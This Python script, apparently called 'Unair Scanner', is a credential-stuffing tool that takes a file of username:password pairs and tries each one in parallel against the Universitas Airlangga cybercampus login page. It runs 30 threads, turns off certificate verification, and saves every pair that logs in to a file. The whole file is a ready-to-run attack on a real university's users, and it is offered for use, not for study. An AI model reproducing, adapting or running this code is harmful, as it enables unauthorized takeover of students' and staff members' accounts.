import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
import os, time, random, platform, hashlib, sys, urllib.parse, requests.packages.urllib3
import os, time, platform, requests as req, requests.packages.urllib3
try:
	import requests as req
	from bs4 import BeautifulSoup as bs
except:
	os.system('pip install --upgrade pip')
	os.system('pip install requests bs4')
	os.system('clear')
	exit('Install bahan selesai\nSilahkan restart script')
else:
	grey = '\x1b[90m'
	red = '\x1b[91m'
	green = '\x1b[92m'
	yellow = '\x1b[93m'
	blue = '\x1b[94m'
	purple = '\x1b[95m'
	cyan = '\x1b[96m'
	white = '\x1b[37m'
	bold = '\033[1m'
	flag = '\x1b[47;30m'
	off = '\x1b[m'
	rv = platform.uname()
	me = rv.release
	found = []
	error = []
	xtc = []

os.system('clear')
def univ(i, usr, pwd):
	ses = req.Session()
	url = 'https://cybercampus.unair.ac.id/login.php'
	tok = bs(ses.get(url, timeout=10, verify=False).text, 'html.parser').findAll('input')
	dat = { 'mode':'login', 'username':usr, 'password':pwd, 'submit':'login'}
	post = bs(ses.post(url, data=dat, timeout=10, verify=False).text, 'html.parser').text
	if "Universitas Airlangga Cyber Campus" in post:
		print(f"{off}{bold}{white}[{red}MODAR{off}{bold}{white}]{bold}{white}-> {bold}{red}{usr}{bold}{white}:{bold}{red}{pwd}{off}")
		error.append(f"{usr}")
	else:
		print(f"{off}{bold}{white}[{green}AKTIF{off}{bold}{white}]{bold}{white}-> {bold}{green}{usr}{bold}{white}:{bold}{green}{pwd}{off}")
		found.append(f"{usr}")
		with open('aktif_unair.txt', 'a') as save:
		    save.write(f"{usr}:{pwd}\n")
	
def main():
	print(f"  ___________________________")
	print(f" [{blue}{off}{flag} Unair Scanner | AkbarCode {off}]")
	print(" https://t.me/Akbar218")
	print("")
	print(f" {purple}[{white}+{purple}]{white} File harus berisi username & password")
	path = input(f" {purple}[{white}?{purple}]{white} Input file : ")
	with open(path, 'r') as (file):
		lines = file.readlines()
		count = 1
		print(f" {purple}[{white}+{purple}]{white} Total {len(lines)} baris terdeteksi")
		print("")
		with ThreadPoolExecutor(max_workers=30) as crot:
			for line in lines:
				user = line.strip().split(':')[0]
				pswd = line.strip().split(':')[1]
				crot.submit(univ, count, user, pswd)
				count += 1
				continue

		print("")
		print(f" {green}[{white}!{green}]{white} Scan selesai")
		print(f" {purple}[{white}*{purple}]{white} AKTIF : {green}{len(found)}")
		print(f" {purple}[{white}*{purple}]{white} MODAR : {red}{len(error)}")
		print(f" {green}[{white}!{green}]{white} Akun aktif disimpan")
		print(f" {cyan}[{white}*{cyan}]{white} Subscribe : {green}~")

		
	
if __name__ == '__main__':
	
	main()

